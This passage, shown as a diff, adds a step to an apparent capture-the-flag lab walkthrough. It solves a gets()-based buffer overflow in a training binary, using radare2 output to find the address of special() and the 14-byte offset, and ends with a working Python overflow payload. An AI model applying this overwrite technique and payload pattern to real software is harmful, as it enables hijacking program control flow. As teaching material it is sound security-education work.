@@ -405,4 +405,114 @@ int main(int argc, char **argv)
     new_ptr();
 }
 ```
+Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 
 
+Keep in mind that the architecture of this machine is little endian!
+
+First of the endian is right at the start of 'file' command results:
+```
+overflow-2]$ file func-pointer
+func-pointer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=4a487843f261c593a102467ecb5ea0f8cbb69b98, not stripped
+```
+LSB = Little Endian 
+
+## Why does the challenge mention LSB?
+Because your exploit payload must contain the address of special() in little‑endian order.
+When you overflow the buffer, you replace the bytes of new_ptr with the bytes of the address of special().
+
+The CPU expects that address in little‑endian byte order.
+
+A closer look at the functions using radare2 in AFL the address of special() is 0x00400567
+```
+overflow-2]$ radare2 func-pointer
+ -- I love gradients.
+[0x00400490]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x00400490]> afl
+0x00400490    1 42           entry0
+0x004004c0    4 42   -> 37   sym.deregister_tm_clones
+0x004004f0    4 58   -> 55   sym.register_tm_clones
+0x00400530    3 34   -> 29   entry.fini0
+0x00400560    1 7            entry.init0
+0x00400660    1 2            sym.__libc_csu_fini
+0x00400664    1 9            sym._fini
+0x00400593    1 22           sym.other
+0x00400470    1 6            sym.imp.printf
+0x004005f0    3 101  -> 92   sym.__libc_csu_init
+0x00400438    3 23           sym._init
+0x00400567    1 27           sym.special
+0x00400460    1 6            sym.imp.puts
+0x004005a9    1 58           main
+0x00400480    1 6            sym.imp.gets
+0x00400582    1 17           sym.normal
+[0x00400490]> 
+```
+specail() located at 0x00400567
+As 8‑byte little‑endian:
+67 05 40 00 00 00 00 00
+In a Python string:
+b"\x67\x05\x40\x00\x00\x00\x00\x00"
+
+Option A – inspect main in radare2
+```
+0x00400470]> pdf @ main
+\u250c 58: int main (int argc, char **argv, char **envp);
+\u2502           ; var char **var_30h @ rbp-0x30
+\u2502           ; var int64_t var_24h @ rbp-0x24
+\u2502           ; var char *s @ rbp-0x16
+\u2502           ; var int64_t var_8h @ rbp-0x8
+\u2502           ; arg int argc @ rdi
+\u2502           ; arg char **argv @ rsi
+\u2502           ; DATA XREF from entry0 @ 0x4004ad
+\u2502           0x004005a9      55             push rbp
+\u2502           0x004005aa      4889e5         mov rbp, rsp
+\u2502           0x004005ad      4883ec30       sub rsp, 0x30
+\u2502           0x004005b1      897ddc         mov dword [var_24h], edi    ; argc
+\u2502           0x004005b4      488975d0       mov qword [var_30h], rsi    ; argv
+\u2502           0x004005b8      48c745f88205.  mov qword [var_8h], sym.normal ; 0x400582
+\u2502           0x004005c0      488d45ea       lea rax, [s]
+\u2502           0x004005c4      4889c7         mov rdi, rax                ; char *s
+\u2502           0x004005c7      b800000000     mov eax, 0
+\u2502           0x004005cc      e8affeffff     call sym.imp.gets           ; char *gets(char *s)
+\u2502           0x004005d1      488b55f8       mov rdx, qword [var_8h]
+\u2502           0x004005d5      b800000000     mov eax, 0
+\u2502           0x004005da      ffd2           call rdx
+\u2502           0x004005dc      b800000000     mov eax, 0
+\u2502           0x004005e1      c9             leave
+\u2514           0x004005e2      c3             ret
+[0x00400470]> 
+```
+From pdf @ main:
+
+s (your buffer[14]) is at: rbp - 0x16
+
+var_8h (your new_ptr) is at: rbp - 0x8
+
+Distance between them: 0𝑥16 − 0𝑥8 = 0𝑥𝐸 = 14
+
+So:
+
+- 14 bytes → fill buffer
+- next 8 bytes → overwrite new_ptr with the address of special()
+
+You already have:
+special() = 0x00400567
+Little‑endian 8‑byte form: 67 05 40 00 00 00 00 00
+
+So your final payload is:
+```
+python3 -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
+```
+
+You should see: 
+```
+this is the special function
+you did this, friend!
+```
